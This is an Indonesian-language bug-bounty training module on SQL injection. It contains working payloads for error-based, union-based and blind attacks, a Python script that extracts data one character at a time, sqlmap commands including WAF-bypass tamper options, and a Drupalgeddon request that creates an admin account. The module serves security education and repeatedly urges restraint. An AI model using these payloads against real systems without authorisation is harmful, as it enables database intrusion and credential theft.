# Sesi 10 — SQL Injection: Dari Error ke Data Exfiltration

> **Level:** Intermediate  
> **Durasi Estimasi:** 5–6 jam (teori + praktik)  
> **Prasyarat:** Sesi 02 (HTTP Fundamentals), Sesi 04 (Recon)  
> **Tools:** Burp Suite, sqlmap, Manual payloads, Browser DevTools

---

## 🎯 Tujuan Pembelajaran

Setelah menyelesaikan sesi ini, peserta mampu:
- Mengidentifikasi injection point di query string, POST body, headers, dan cookies
- Membedakan Error-based, Blind Boolean, Blind Time-based, dan Out-of-Band SQLi
- Melakukan manual exploitation SQLi untuk validasi bug bounty report
- Menggunakan sqlmap dengan opsi yang tepat dan tidak merusak
- Menentukan severity yang benar berdasarkan data yang bisa diakses
- Menulis laporan SQLi yang valid dengan PoC minimal

---

## 📚 Bagian 1 — Konsep SQL Injection

### 1.1 Mengapa SQLi Masih Ada?

Meskipun framework modern (ORM, PDO, prepared statements) sudah banyak yang menggunakan parameterized queries, SQLi masih ditemukan karena:

```
1. Legacy code yang belum di-update
2. Raw query di custom reporting module
3. ORM yang di-bypass untuk "performance"
4. Search/filter feature dengan dynamic query building
5. Stored procedure yang menerima dynamic input
6. Admin panel yang dibuat "internal only" tanpa pengecekan serius
```

### 1.2 Anatomy SQL Injection

```sql
-- Kode PHP rentan
$query = "SELECT * FROM users WHERE username = '" . $_GET['user'] . "'";

-- Input normal
user=johndoe
-- Query: SELECT * FROM users WHERE username = 'johndoe'

-- Injection
user=johndoe' OR '1'='1
-- Query: SELECT * FROM users WHERE username = 'johndoe' OR '1'='1'
-- → Mengembalikan SEMUA user!

-- Comment-based
user=admin'--
-- Query: SELECT * FROM users WHERE username = 'admin'--' AND password='...'
-- → Komentar '--' membatalkan cek password → Login bypass!
```

### 1.3 Peta Jenis SQL Injection

```
SQL INJECTION
│
├── IN-BAND (response langsung terlihat)
│   ├── Error-based       → pesan error reveal struktur DB
│   └── Union-based       → gabung query → ambil data dari tabel lain
│
├── BLIND (tidak ada data di response, hanya true/false atau delay)
│   ├── Boolean-based     → respons berbeda untuk true vs false
│   └── Time-based        → delay saat kondisi true
│
└── OUT-OF-BAND
    └── DNS/HTTP exfil     → data dikirim via DNS lookup / HTTP request
```

---

## 📚 Bagian 2 — Error-Based SQL Injection

### 2.1 Deteksi dengan Single Quote

```http
# Injection point kandidat
GET /products?id=1
GET /search?q=test
GET /user/profile?user_id=42
POST /api/login  body: {"username":"admin","password":"test"}

# Test dasar: masukkan karakter khusus
GET /products?id=1'
GET /products?id=1"
GET /products?id=1`
GET /products?id=1\

# Response yang menandakan SQLi:
# - MySQL error: You have an error in your SQL syntax
# - MSSQL error: Unclosed quotation mark
# - Oracle error: ORA-01756: quoted string not properly terminated
# - PostgreSQL error: unterminated quoted string at or near "'"
```

### 2.2 Error-based Exploitation (MySQL)

```sql
-- Ekstrak versi database
' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION())) --

-- Ekstrak nama database
' AND EXTRACTVALUE(1, CONCAT(0x7e, DATABASE())) --

-- Ekstrak nama tabel dari information_schema
' AND EXTRACTVALUE(1, CONCAT(0x7e, (
  SELECT table_name FROM information_schema.tables 
  WHERE table_schema=DATABASE() LIMIT 0,1
))) --

-- Ekstrak kolom dari tabel
' AND EXTRACTVALUE(1, CONCAT(0x7e, (
  SELECT column_name FROM information_schema.columns 
  WHERE table_name='users' LIMIT 0,1
))) --
```

---

## 📚 Bagian 3 — Union-Based SQL Injection

### 3.1 Temukan Jumlah Kolom

```sql
-- Method 1: ORDER BY (temukan batas jumlah kolom)
' ORDER BY 1 --   → OK
' ORDER BY 2 --   → OK
' ORDER BY 3 --   → OK
' ORDER BY 4 --   → ERROR! → 3 kolom

-- Method 2: UNION SELECT NULL
' UNION SELECT NULL --
' UNION SELECT NULL, NULL --
' UNION SELECT NULL, NULL, NULL --   → OK = 3 kolom
```

### 3.2 Temukan Kolom yang Tampil di Response

```sql
-- Ganti NULL satu per satu dengan string unik
' UNION SELECT 'a', NULL, NULL --
' UNION SELECT NULL, 'a', NULL --   → muncul 'a' di halaman = kolom 2 tampil
' UNION SELECT NULL, NULL, 'a' --
```

### 3.3 Ekstrak Data

```sql
-- Setelah tahu jumlah kolom (misal 3) dan kolom yang tampil (misal kolom 2)

-- Versi DB
' UNION SELECT NULL, VERSION(), NULL --

-- Database saat ini
' UNION SELECT NULL, DATABASE(), NULL --

-- Semua tabel
' UNION SELECT NULL, GROUP_CONCAT(table_name), NULL 
  FROM information_schema.tables 
  WHERE table_schema=DATABASE() --

-- Semua kolom di tabel users
' UNION SELECT NULL, GROUP_CONCAT(column_name), NULL
  FROM information_schema.columns 
  WHERE table_name='users' --

-- Dump data (username + password hash)
' UNION SELECT NULL, GROUP_CONCAT(username,':',password SEPARATOR '\n'), NULL 
  FROM users --
```

---

## 📚 Bagian 4 — Blind SQL Injection

### 4.1 Boolean-Based Blind

```sql
-- Tidak ada error, tidak ada data di response
-- Tapi response BERBEDA untuk kondisi true vs false

-- Test dasar
' AND 1=1 --    → Response normal (kondisi TRUE)
' AND 1=2 --    → Response berbeda (kondisi FALSE) → BLIND SQLi!

-- Ekstrak data karakter per karakter
' AND SUBSTRING(DATABASE(),1,1)='a' --   → false
' AND SUBSTRING(DATABASE(),1,1)='b' --   → false
...
' AND SUBSTRING(DATABASE(),1,1)='p' --   → TRUE! → karakter pertama = 'p'

-- Automasi dengan sqlmap atau script Python
```

### 4.2 Time-Based Blind

```sql
-- Saat response selalu sama (true/false tidak bisa dibedakan)
-- Gunakan delay sebagai indikator

-- MySQL
' AND SLEEP(5) --   → jika delay 5 detik = SQLi!
' AND IF(1=1, SLEEP(5), 0) --        → delay = true
' AND IF(1=2, SLEEP(5), 0) --        → tidak delay = false

-- PostgreSQL
'; SELECT pg_sleep(5) --

-- MSSQL
'; WAITFOR DELAY '0:0:5' --

-- Oracle
' OR 1=1 AND dbms_pipe.receive_message('a',5) = 1 --
```

### 4.3 Script Python untuk Blind Boolean Extraction

```python
import requests
import string

TARGET = "https://target.com/products"
CHARSET = string.ascii_lowercase + string.digits + '_-@.'
COOKIE = {"session": "your_session_token_here"}

def check(payload):
    """Kirim payload, return True jika response menandakan kondisi true"""
    params = {"id": f"1 AND ({payload})"}
    r = requests.get(TARGET, params=params, cookies=COOKIE)
    # Sesuaikan kondisi berdasarkan perbedaan response
    return "Product" in r.text  # atau cek len(r.text) > threshold

def extract_string(sql_expr, max_length=50):
    """Ekstrak string dari ekspresi SQL karakter per karakter"""
    result = ""
    for pos in range(1, max_length + 1):
        found = False
        for char in CHARSET:
            payload = f"SUBSTRING(({sql_expr}),{pos},1)='{char}'"
            if check(payload):
                result += char
                print(f"\r[*] Extracting: {result}", end='', flush=True)
                found = True
                break
        if not found:
            break
    return result

# Ekstrak nama database
print("[+] Database name:")
db_name = extract_string("SELECT DATABASE()")
print(f"\n[+] Found: {db_name}")

# Ekstrak tabel pertama
print("[+] First table:")
table = extract_string("SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT 0,1")
print(f"\n[+] Found: {table}")
```

---

## 📚 Bagian 5 — sqlmap untuk Bug Bounty

### 5.1 Aturan Penggunaan sqlmap dalam Bug Bounty

> ⚠️ **Penting:** Selalu cek program rules sebelum menggunakan scanner otomatis. Banyak program melarang automated scanning. Jika diizinkan, gunakan dengan opsi `--risk` dan `--level` yang konservatif.

```bash
# Setup dasar
sqlmap -u "https://target.com/products?id=1" \
       --cookie="session=your_token" \
       --risk=1 \
       --level=1 \
       --batch  # non-interactive, pakai default answer

# Deteksi saja (tanpa eksploitasi data)
sqlmap -u "https://target.com/products?id=1" \
       --detection-only \
       --batch

# Jika SQLi confirmed, baru ekstrak minimal data untuk PoC
sqlmap -u "https://target.com/products?id=1" \
       --dbs \          # list database
       --batch

# Ekstrak nama tabel (bukan isi!)
sqlmap -u "https://target.com/products?id=1" \
       -D target_db \
       --tables \
       --batch

# PoC minimal — cukup tunjukkan akses ke tabel users
# JANGAN dump seluruh tabel tanpa izin eksplisit!
sqlmap -u "https://target.com/products?id=1" \
       -D target_db -T users \
       --count \  # hitung jumlah baris saja untuk PoC
       --batch
```

### 5.2 sqlmap untuk POST Request

```bash
# Simpan request dari Burp ke file
# File: request.txt
POST /api/search HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=xxx

{"query": "test", "category": "1"}

# Jalankan sqlmap dengan file
sqlmap -r request.txt \
       --data='{"query": "test", "category": "*"}' \
       --dbms=mysql \
       --batch

# Untuk JSON injection
sqlmap -r request.txt \
       --level=2 \
       --dbms=mysql \
       --batch
```

### 5.3 Bypass WAF dengan sqlmap

```bash
# Gunakan tamper scripts
sqlmap -u "https://target.com/?id=1" \
       --tamper=space2comment,between,randomcase \
       --batch

# Tamper scripts umum:
# space2comment   → spasi → /**/
# between         → NOT BETWEEN 0 AND X
# randomcase      → raNdOm CaSe
# hex2char        → string ke hex
# equaltolike     → = ke LIKE
```

---

## 📚 Bagian 6 — SQL Injection di Headers & Cookies

### 6.1 Injection di HTTP Headers

```http
# User-Agent header
GET /page HTTP/1.1
User-Agent: Mozilla/5.0' OR SLEEP(5)--

# X-Forwarded-For (sering disimpan ke log/DB)
GET /page HTTP/1.1
X-Forwarded-For: 127.0.0.1' OR SLEEP(5)--

# Referer
GET /page HTTP/1.1
Referer: https://target.com/page' OR SLEEP(5)--

# Custom headers
X-Custom-Header: value' OR SLEEP(5)--
```

### 6.2 Injection di Cookie

```http
# Cookie value adalah injection point yang sering terlewat!
GET /dashboard HTTP/1.1
Cookie: user_id=1'; SELECT SLEEP(5)--

# Atau cookie tracking yang disimpan ke analytics DB
Cookie: session=abc; tracking_id=xyz' OR SLEEP(5)--
```

---

## 🔴 Real Bug Bounty Cases

### Case 1 — SQL Injection di Drupal Core (CVE-2014-3704 "Drupalgeddon")

> **Source:** Drupal Security Advisory SA-CORE-2014-005  
> **CVE:** CVE-2014-3704  
> **Severity:** Critical  
> **Affected:** Drupal 7.x sebelum 7.32

**Detail:**
Drupal 7 memiliki SQL injection di endpoint `/` melalui parameter `name[]` pada form login. Bug ini terjadi karena Drupal tidak memvalidasi array input sebelum memasukkannya ke query database.

```http
POST / HTTP/1.1
Host: drupal.target.com
Content-Type: application/x-www-form-urlencoded

name[0%20;INSERT%20INTO%20users(name,pass,mail,status,rid)
SELECT%20'admin2','$S$D...','admin2@evil.com',1,3;%20--]=1
&pass=test&form_build_id=xxx&form_id=user_login&op=Log+in
```

**Impact:** Unauthenticated remote code execution karena bisa membuat akun admin baru.  
**Sumber:** [Drupal Security Advisory](https://www.drupal.org/SA-CORE-2014-005) (publik)

---

### Case 2 — Time-Based Blind SQLi di HackerOne Target (Disclosed Pattern)

> **Referensi:** Pola umum dari H1 disclosed reports tentang analytics/reporting endpoints  
> **Severity:** High (P2)

**Skenario:**
Peneliti menemukan endpoint filter laporan yang vulnerable:

```http
# Request normal
GET /api/reports?date_from=2024-01-01&date_to=2024-01-31 HTTP/1.1
Authorization: Bearer [token]

# Test time-based blind
GET /api/reports?date_from=2024-01-01&date_to=2024-01-31' AND SLEEP(5)-- HTTP/1.1
# Response time: 5+ detik → CONFIRMED TIME-BASED BLIND SQLI

# Cara report yang benar: cukup tunjukkan delay, tidak perlu dump data
```

---

### Case 3 — SQLi di API Parameter dengan JSON Body

> **Referensi:** Pola dari beberapa H1 reports tentang JSON-based SQLi  
> **Severity:** High–Critical

**Skenario:**
Backend menggunakan string interpolation untuk query dari JSON body tanpa sanitasi.

```http
POST /api/v1/search HTTP/1.1
Content-Type: application/json

{"query": "laptop", "brand": "samsung' AND 1=1-- "}

# Response: hasil normal → kemungkinan SQLi (kondisi 1=1 true)

{"query": "laptop", "brand": "samsung' AND 1=2-- "}
# Response: tidak ada hasil → kondisi 1=2 false → Boolean SQLi confirmed!

# Eskalasi ke Union
{"query": "laptop", "brand": "x' UNION SELECT 1,2,3-- "}
```

---

### Case 4 — Second-Order SQLi (Stored SQLi)

> **Referensi:** Teknik advanced dari security research, pola dari aplikasi yang melakukan sanitasi di input tapi tidak di query berikutnya  
> **Severity:** High

**Konsep:**
```
Langkah 1: Register dengan username yang mengandung payload SQL
Username: admin'--

Langkah 2: Input di-sanitize dan disimpan: admin\'--
(tanda backslash di-escape, aman tersimpan di DB)

Langkah 3: Ketika fitur lain menggunakan username dari DB tanpa sanitasi ulang:
UPDATE passwords SET pass='$new_pass' WHERE user='admin'--'
Query dieksekusi tanpa WHERE yang benar → update password SEMUA user!
```

---

## 🛠️ Lab Praktik

### Lab 1 — PortSwigger Web Academy (Gratis — Paling Lengkap)
- 🔗 [SQL injection UNION attack, determining number of columns](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)
- 🔗 [Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
- 🔗 [Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)
- 🔗 [All SQL Injection Labs](https://portswigger.net/web-security/sql-injection)

### Lab 2 — DVWA
```bash
docker run -d -p 80:80 vulnerables/web-dvwa
# Security Level: Low → Medium → High
# Modul: SQL Injection, SQL Injection (Blind)
```

### Lab 3 — HackTheBox Academy
- 🔗 [SQL Injection Fundamentals](https://academy.hackthebox.com/module/details/33)
- 🔗 [SQLMap Essentials](https://academy.hackthebox.com/module/details/58)

### Lab 4 — TryHackMe
- 🔗 [SQL Injection](https://tryhackme.com/room/sqlinjectionlm)
- 🔗 [Advanced SQL Injection](https://tryhackme.com/room/advancedsqlinjection)

### Lab 5 — Hack The Box Machines
- 🔗 [HackTheBox — Machines dengan SQLi: Cronos, Valentine (legacy)]

---

## 📋 SQL Injection Testing Checklist

```markdown
## SQLi Checklist untuk [ENDPOINT]

### Injection Points
- [ ] URL query parameters (?id=, ?search=, ?user=)
- [ ] POST body (form data, JSON)
- [ ] HTTP headers (User-Agent, Referer, X-Forwarded-For, Cookie)
- [ ] Path segments (/api/user/INJECT)

### Detection
- [ ] Single quote (') → error?
- [ ] ' OR '1'='1 → behavior change?
- [ ] AND SLEEP(5) → delay?
- [ ] ' AND 1=1 -- vs ' AND 1=2 -- → response berbeda?

### Type Identification
- [ ] Error visible → Error-based (mudah exploit)
- [ ] Response berbeda true/false → Boolean blind
- [ ] Response delay → Time-based blind
- [ ] No difference → Out-of-band (Burp Collaborator)

### Exploitation (Minimal untuk PoC)
- [ ] Version(): `@@version` atau `VERSION()`
- [ ] Database name: `DATABASE()`
- [ ] Table count (BUKAN isi data)
- [ ] Screenshot response sebagai bukti

### sqlmap (jika diizinkan program)
- [ ] `--risk=1 --level=1` (konservatif)
- [ ] `--detection-only` untuk confirm saja
- [ ] Dokumentasikan command yang digunakan
```

---

## 📖 Referensi & Bacaan Lanjutan

| Sumber | Link | Topik |
|--------|------|-------|
| PortSwigger | [SQL Injection Complete Guide](https://portswigger.net/web-security/sql-injection) | Comprehensive SQLi |
| OWASP | [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) | Defense techniques |
| PayloadsAllTheThings | [SQLi Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) | Payload collections |
| HackTricks | [SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection) | Techniques & bypass |
| sqlmap | [Official Documentation](https://sqlmap.org/) | Tool docs |
| pentestmonkey | [SQL Injection Cheatsheet](https://pentestmonkey.net/category/cheat-sheet/sql-injection) | DB-specific payloads |

---

## 🔑 Key Takeaways

1. **SQLi masih ada di legacy & custom code** — selalu uji endpoint search, filter, dan reporting
2. **Time-based blind = aman untuk PoC** — delay 5 detik sudah cukup untuk membuktikan SQLi tanpa dump data
3. **Jangan dump data yang tidak perlu** — untuk bounty, cukup tunjukkan versi DB dan nama database
4. **Headers dan cookies juga injection point** — bukan hanya URL dan form body
5. **Second-order SQLi sering terlewat** — username di profil yang digunakan kembali di query lain

---

*Sesi berikutnya: **Sesi 09 — CSRF & Clickjacking***
